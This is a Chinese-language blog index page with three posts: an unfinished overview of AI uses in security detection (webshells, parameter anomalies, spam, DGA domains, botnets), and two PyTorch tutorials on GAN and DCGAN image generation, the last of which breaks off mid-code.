<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="AnchoretY&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="AnchoretY&#39;s blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="AnchoretY&#39;s blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"right","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>AnchoretY's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <a href="https://github.com/AnchoretY">
	<img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_green_007200.png" alt="Fork me on GitHub">
    </a>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">AnchoretY's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/21/对AI安全技术实际应用的一些看法/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/21/对AI安全技术实际应用的一些看法/" itemprop="url">对AI安全技术实际应用的一些看法</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-21T09:25:30+08:00">
                2020-02-21
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    本文主要是AI技术在安全领域中的一些可能应用点做一些总结，希望在AI安全上也能贡献出自己的一份力量。</p>
<h3 id="1-入侵检测"><a href="#1-入侵检测" class="headerlink" title="1.入侵检测"></a>1.入侵检测</h3><p>​    这里比较火的主要有几个小类：</p>
<ol>
<li><p>Webshell检测</p>
<p>AI与Webshell检测的结合是许多公司在AI+入侵检测领域一般最先想要去进行研究的部分，因为Webshell危险等级很高，并且使用传统的方式只能够防御一些已有的Webshell攻击，而对新发生的Webshell攻击很难直接使用已有的规则方式进行预防，因此只能将希望寄托在AI上，这里也是我重点在研究的方向，目前针对该问题主要存在的一些解决方案如下：</p>
<ol>
<li>完全使用深度学习的方式进行检测</li>
<li>使用先验知识进行特征提取然后使用机器学习建模进行检测</li>
</ol>
</li>
<li><p>参数异常检测</p>
<p>​    参数异常检测目前主流的方式是使用HMM进行检测，在实际使用过程检测的效果还是非常不错·，模型能够有效的发现未知的攻击，但是唯一存在的问题就是<strong>模型运行效率问题</strong>，由于该模型对每一个要访问的页面都要构建一个模型，由于模型量巨大因此很难应用在大范围的主干网络对不同的站点进行检测，单<strong>对于公司内部网页站点数比较少的情况还是非常值得进行尝试的。</strong></p>
<p><img src="" alt=""></p>
</li>
</ol>
<h3 id="2-垃圾邮件识别"><a href="#2-垃圾邮件识别" class="headerlink" title="2.垃圾邮件识别"></a>2.垃圾邮件识别</h3><p>​    垃圾邮件识别应该是最早使用AI去进行解决的安全问题，也是目前取得的效果最好，在实际环境中更多别采用的一种。垃圾邮件的识别从本质上来说就是一些半结构化的数据从文本的角度金慈宁</p>
<h3 id="3-DGA域名检测"><a href="#3-DGA域名检测" class="headerlink" title="3.DGA域名检测"></a>3.DGA域名检测</h3><p>​    对于DGA域名的检测，各个公司研究的也算比较多的</p>
<p>​    在几年以前DGA域名的识别在机器学习开始兴起后逐渐流行起了使用先验知识进行最长连续字母长度、最长连续数字长度等域名随机读衡量的统计特征人工提取，然后再使用各种各样的机器学习进行建模的过程，虽然在各种paper中效果良好，但是在我的实际使用过程中效果差强人意。而近年来人们渐渐意识到，由于DGA域名的展现形式与正常流量展现形式的差异表现很难直接使用人工的方式进行描述，因此将主要精力放在了使用深度学习技术进行DGA域名检测研究中来，通过大量的实验研究也证明了深度学习技术更加适合解决该问题。</p>
<h3 id="4-僵尸网络检测"><a href="#4-僵尸网络检测" class="headerlink" title="4.僵尸网络检测"></a>4.僵尸网络检测</h3><p>​    使用AI技术进行僵尸网络的检测目前也是一个非常热的问题，但大多处于发papar灌水阶段，目前没有通说有公司使用。本人研究的不多，这里不做展开。</p>
<h3 id="未来的展望"><a href="#未来的展望" class="headerlink" title="未来的展望"></a>未来的展望</h3><p>​    1.对于Webshell检测的研究目前大多只停留在使用单条流量进行Webshell进行检测上，但实际环境中要想真正使用AI技术进行Webshell检测并直接进行响应，还用使用多条流量，</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/对抗样本生成——DCGAN/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/对抗样本生成——DCGAN/" itemprop="url">对抗样本生成——DCGAN</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T23:51:32+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    本文为对抗样本生成系列文章的第二篇文章，主要对DCGAN的原理进行介绍，并对其中关键部分的使用pytorch代码进行介绍，另外如果有需要完整代码的同学可以关注我的<a href="https://github.com/AnchoretY/Webshell_Sample_Generate/blob/master/GAN%20image%20generate.ipynb" target="_blank" rel="noopener">github</a>。该系列包含的文章还包括：</p>
<ul>
<li><a href="https://anchorety.github.io/2020/02/12/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94VAE/" target="_blank" rel="noopener">对抗样本生成—VAE</a></li>
<li><a href="[https://anchorety.github.io/2020/02/13/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94GAN/](https://anchorety.github.io/2020/02/13/对抗样本生成——GAN/">对抗样本生成—GAN</a>)</li>
<li><a href="[https://anchorety.github.io/2020/02/13/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94DCGAN/](https://anchorety.github.io/2020/02/13/对抗样本生成——DCGAN/">对抗样本生成—DCGAN</a>)</li>
<li><a href="">对抗样本生成—文本生成</a></li>
</ul>
<p>​    DCGAN时CNN与GAN相结合的一种实现方式，源自于论文《Unsupervised Representation Learning with Deep Convolutional Generative Adversarial Networks》，该模型主要讨论了如何将CNN引入GAN网络，将CNN引入GAN网络并非直接将Generator和Discriminator的全连接网络直接替换成CNN即可，而是要对CNN网络进行特定的设计才能使CNN网络有效的快速收敛。本文将对DCGAN中一些核心观点进行详细论述并对其中核心部分的代码实现进行解析，完整的代码实现可以关注我的<a href="https://github.com/AnchoretY/Webshell_Sample_Generate/blob/master/DCGAN%20image%20generate.ipynb" target="_blank" rel="noopener">github</a>.</p>
<p>​    DCGAN中一些核心关键点如下：</p>
<blockquote>
<p><strong>1.激活函数</strong>：</p>
<p>​    <strong>生成器除最后一层的输出使用Tanh激活函数外统一使用relu</strong>作为激活函数，</p>
<p>​    <strong>判别器所有层都是用LeakyRelu激活函数</strong>(这里很关键，还是使用relu的话很可能造成模型很难进行有优化，最终模型输出的图像一致和目标图像相差很远)</p>
<p>2<strong>.生成器和判别器的模型结构复杂度不要差距太大</strong></p>
<p>​    复杂度差距过大会导致模型训练后期一个部分的效果非常好，能够不断提升，但是另一个部分的由于模型过于简单无法再优化导致该部分效果不断变差。</p>
<p>3.<strong>判别器最后的全连接层使用卷积层代替。</strong></p>
<p>​    全部的操作均使用卷积操作进行。</p>
<p>4.<strong>Batch Normalization区别应用：</strong></p>
<p>​    不能将BN层应用到生成网络和判别网络的全部部分，<strong>在生成网络的输出层和判别网络的输入层不能使用BN层</strong>，否则可能造成模型的不稳定。</p>
</blockquote>
<h3 id="原始对抗训练细节实现"><a href="#原始对抗训练细节实现" class="headerlink" title="原始对抗训练细节实现"></a>原始对抗训练细节实现</h3><blockquote>
<p>预处理：将输入图像的各个像素点标准化到tanh的值域范围[-1,1]之内</p>
<p>权重初始化:均值为0方差为0.02的正态分布</p>
<p>Relu激活函数斜率：0.2</p>
<p>优化器：Adam  0.01或0.0002</p>
</blockquote>
<h3 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h3><p>​    生成器主要反卷积层、BN层、激活函数层三部分堆叠而成，其结构如下所示：</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/DCGAN生成器结构.png?raw=true" alt=""></p>
<blockquote>
<p>在DCGAN中一个最为核心的结构就是反卷积层，那么什么是反卷积层呢？</p>
<p>​    <strong>反卷积是图像领域中常见的一种上采样操作</strong>，反卷积<strong>并不是正常卷积的逆过程，而是一种特殊的正向卷积</strong>，先按照一定的比例通过补 0来扩大输入图像的尺寸，接着旋转卷积核，再进行正向卷积，这种特殊的卷积操作<strong>只能能够复原矩阵的原始尺寸，不能对原矩阵的各个元素的内容进行复原。</strong></p>
</blockquote>
<p>生成器实现中核心点包括：</p>
<blockquote>
<p>1.使用反卷积进行一步一步的图片生成</p>
<p>2.最后的输出层中不使用BN</p>
<p>3.除输出层使用tanh激活函数外，其它层都使用relu激活函数</p>
</blockquote>
<p>​    代码实现如下(该代码为手写数字图片生成项目中的实现，真实维度为28*28)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Generator</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Generator,self).__init__()</span><br><span class="line">        self.layer1 = nn.Sequential(</span><br><span class="line">            nn.ConvTranspose2d(latent_size,<span class="number">128</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">0</span>,bias=<span class="keyword">False</span>),  <span class="comment">#使用反卷积进行还原(b,512,4,4)</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">            nn.ReLU(<span class="keyword">True</span>)    <span class="comment">#生成器中除输出层外均使用relu激活函数</span></span><br><span class="line">        )</span><br><span class="line">        self.layer2 = nn.Sequential(</span><br><span class="line">            nn.ConvTranspose2d(<span class="number">128</span>,<span class="number">64</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,bias=<span class="keyword">False</span>),  <span class="comment">##使用反卷积进行还原(b,64,8,8)</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.ReLU(<span class="keyword">True</span>),   <span class="comment">#生成器中除输出层外均使用relu激活函数</span></span><br><span class="line">        )</span><br><span class="line">        self.layer3 = nn.Sequential(</span><br><span class="line">            nn.ConvTranspose2d(<span class="number">64</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,bias=<span class="keyword">False</span>),  <span class="comment">##使用反卷积进行还原(b,8,16,16)</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">32</span>),</span><br><span class="line">            nn.ReLU(<span class="keyword">True</span>)   <span class="comment">#生成器中除输出层外均使用relu激活函数</span></span><br><span class="line">        )</span><br><span class="line">        <span class="comment"># 生成器的输出层不使用BN</span></span><br><span class="line">        self.layer4 = nn.Sequential(</span><br><span class="line">            nn.ConvTranspose2d(<span class="number">32</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>,bias=<span class="keyword">False</span>),  <span class="comment">##使用反卷积进行还原(b,1,28,28)</span></span><br><span class="line">            nn.Tanh(),         </span><br><span class="line">        ) </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self,input_data)</span>:</span></span><br><span class="line">        x = self.layer1(input_data)</span><br><span class="line">        x = self.layer2(x)</span><br><span class="line">        x = self.layer3(x)</span><br><span class="line">        x = self.layer4(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<h3 id="Discriminator"><a href="#Discriminator" class="headerlink" title="Discriminator"></a>Discriminator</h3><p>​    判别器主要为实现对图片是否为生成图片。在DCGAN中主要使用CNN、BN和LeakyRelu网络来进行，其实现的核心点包括：</p>
<blockquote>
<p>1.判别网络全部使用卷积操作来搭建，整个过程中不包含全连接层和池化层。</p>
<p>2.判别器激活函数除最后一层使用Sigmod激活函数外，全部使用LeakyRelu激活函数</p>
<p>3.判别器的输入层中不能使用BN层</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Discriminator</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Discriminator, self).__init__()</span><br><span class="line">        self.cnn1 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">1</span>,<span class="number">16</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">3</span>),     <span class="comment">#(b,13,16,16)</span></span><br><span class="line">            nn.LeakyReLU(<span class="number">0.2</span>,<span class="keyword">True</span>)</span><br><span class="line">        )</span><br><span class="line">        self.cnn2 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">16</span>,<span class="number">32</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>),    <span class="comment">#(b,32,8,8)</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">32</span>),</span><br><span class="line">            nn.LeakyReLU(<span class="number">0.2</span>,<span class="keyword">True</span>),</span><br><span class="line">        )</span><br><span class="line">        self.cnn3 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">32</span>,<span class="number">64</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>),    <span class="comment">#(b,64,4,4)</span></span><br><span class="line">            nn.BatchNorm2d(<span class="number">64</span>),</span><br><span class="line">            nn.LeakyReLU(<span class="number">0.2</span>,<span class="keyword">True</span>)</span><br><span class="line">        )</span><br><span class="line">        self.cnn4 = nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">64</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">0</span>),   <span class="comment">#(b,1,1,1)</span></span><br><span class="line">            nn.Sigmoid()</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self,input_data)</span>:</span></span><br><span class="line">        x = self.cnn1(input_data)</span><br><span class="line">        x = self.cnn2(x)</span><br><span class="line">        x = self.cnn3(x)</span><br><span class="line">        x = self.cnn4(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure>
<p>参考文献：</p>
<p>DCGAN pytorch教程：<a href="https://pytorch.org/tutorials/beginner/dcgan_faces_tutorial.html" target="_blank" rel="noopener">https://pytorch.org/tutorials/beginner/dcgan_faces_tutorial.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/对抗样本生成——GAN/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="AnchoretY">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="AnchoretY's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/13/对抗样本生成——GAN/" itemprop="url">对抗样本生成——GAN</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T10:54:31+08:00">
                2020-02-13
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>​    本文为对抗样本生成系列文章的第二篇文章，主要对GAN的原理进行介绍，并对其中关键部分的使用pytorch代码进行介绍，另外如果有需要完整代码的同学可以关注我的<a href="https://github.com/AnchoretY/Webshell_Sample_Generate/blob/master/GAN%20image%20generate.ipynb" target="_blank" rel="noopener">github</a>。该系列包含的文章还包括：</p>
<ul>
<li><a href="https://anchorety.github.io/2020/02/12/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94VAE/" target="_blank" rel="noopener">对抗样本生成—VAE</a></li>
<li><a href="[https://anchorety.github.io/2020/02/13/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94GAN/](https://anchorety.github.io/2020/02/13/对抗样本生成——GAN/">对抗样本生成—GAN</a>)</li>
<li><a href="[https://anchorety.github.io/2020/02/13/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E7%94%9F%E6%88%90%E2%80%94%E2%80%94DCGAN/](https://anchorety.github.io/2020/02/13/对抗样本生成——DCGAN/">对抗样本生成—DCGAN</a>)</li>
<li><a href="">对抗样本生成—文本生成</a></li>
</ul>
<h3 id="GAN-Generative-Adversarial-Network"><a href="#GAN-Generative-Adversarial-Network" class="headerlink" title="GAN(Generative Adversarial Network)"></a>GAN(Generative Adversarial Network)</h3><p>​    GAN中文名称生成对抗网络，是一种利用模型对抗技术来生成指定类型样本的技术，与VAE一起是目前主要的两种文本生成技术之一。GAN主要包含generater(生成器)和discriminator(判别器)两部分，generator负责生成假的样本来骗过discriminator，discriminator负责对样本进行打分，判断是否为生成网络生成的样本。</p>
<p><img src="https://github.com/AnchoretY/images/blob/master/blog/GAN结构示意图.png?raw=true" alt=""></p>
<h3 id="Generator"><a href="#Generator" class="headerlink" title="Generator"></a>Generator</h3><blockquote>
<p>输入：noise sample（一个随机生成的指定纬度向量）</p>
<p>输出：目标样本（fake image等）</p>
</blockquote>
<p>​    Generator在GAN中负责接收随机的噪声输入，进行目标文本、图像的生成,其<strong>目标就是尽可能的生成更加真实的图片、文字去欺骗discriminator</strong>。具体的实现可以使用任何在其他领域证明有效的神经网络，本文使用最简单的全连接网络作为Generator进行实验。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 生成器结构</span></span><br><span class="line">G = nn.Sequential(</span><br><span class="line">        nn.Linear(latent_size, hidden_size), </span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        nn.Linear(hidden_size, hidden_size),</span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        nn.Linear(hidden_size, image_size),</span><br><span class="line">        nn.Tanh())</span><br></pre></td></tr></table></figure>
<h3 id="Discriminator"><a href="#Discriminator" class="headerlink" title="Discriminator"></a>Discriminator</h3><blockquote>
<p>输入：样本（包含生成的样本和真实样本两部分）</p>
<p>输出：score（一个是否为真实样本的分数，分数越高是真实样本的置信的越高，越低越可能时生成样本）</p>
</blockquote>
<p>​    Discriminator在GAN网络中负责将对输入的图像、文本进行判别，对其进行打分，打分越高越接近真实的图片，打分越低越可能是Generator生成的图像、文本，其<strong>目标是尽可能准确的对真实样本与生成样本进行准确的区分</strong>。与Generator一样Discriminator也可以使用任何网络实现，下面是pytorch中最简单的一种实现。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 判别器结构</span></span><br><span class="line">D = nn.Sequential(</span><br><span class="line">        nn.Linear(image_size, hidden_size), <span class="comment"># 判别的输入时图像数据</span></span><br><span class="line">        nn.LeakyReLU(<span class="number">0.2</span>),</span><br><span class="line">        nn.Linear(hidden_size, hidden_size),</span><br><span class="line">        nn.LeakyReLU(<span class="number">0.2</span>),</span><br><span class="line">        nn.Linear(hidden_size, <span class="number">1</span>),</span><br><span class="line">        nn.Sigmoid())</span><br></pre></td></tr></table></figure>
<h3 id="Model-train"><a href="#Model-train" class="headerlink" title="Model train"></a>Model train</h3><p>​    GAN中由于两部分需要进行对抗，因此两部分并不是与一般神经网络一样整个网络同时进行跟新训练的，而是两部分分别进行训练。训练的基本思路如下所示：</p>
<blockquote>
<p>Epoch:</p>
<pre><code> 1. 生成器使用初始化的参数随机输入向量生成图片。

2. 生成器进行判别，使用判别器结果对判器参数进行更新。
 3. 固定判别器参数，对生成器使用更新好的判别器进行
</code></pre></blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(num_epochs):</span><br><span class="line">    <span class="keyword">for</span> i, (images, _) <span class="keyword">in</span> enumerate(data_loader):</span><br><span class="line">        images = images.reshape(batch_size, <span class="number">-1</span>) </span><br><span class="line">        <span class="comment"># 创建标签，随后会用于损失函数BCE loss的计算</span></span><br><span class="line">        real_labels = torch.ones(batch_size, <span class="number">1</span>)  <span class="comment"># true_label设为1，表示True</span></span><br><span class="line">        fake_labels = torch.zeros(batch_size, <span class="number">1</span>) <span class="comment"># fake_label设为0，表示False</span></span><br><span class="line">        <span class="comment"># ================================================================== #</span></span><br><span class="line">        <span class="comment">#                      训练判别模型                      </span></span><br><span class="line">        <span class="comment"># ================================================================== #</span></span><br><span class="line">        <span class="comment"># 计算真实样本的损失</span></span><br><span class="line">        outputs = D(images)</span><br><span class="line">        d_loss_real = criterion(outputs, real_labels)</span><br><span class="line">        real_score = outputs</span><br><span class="line">        <span class="comment"># 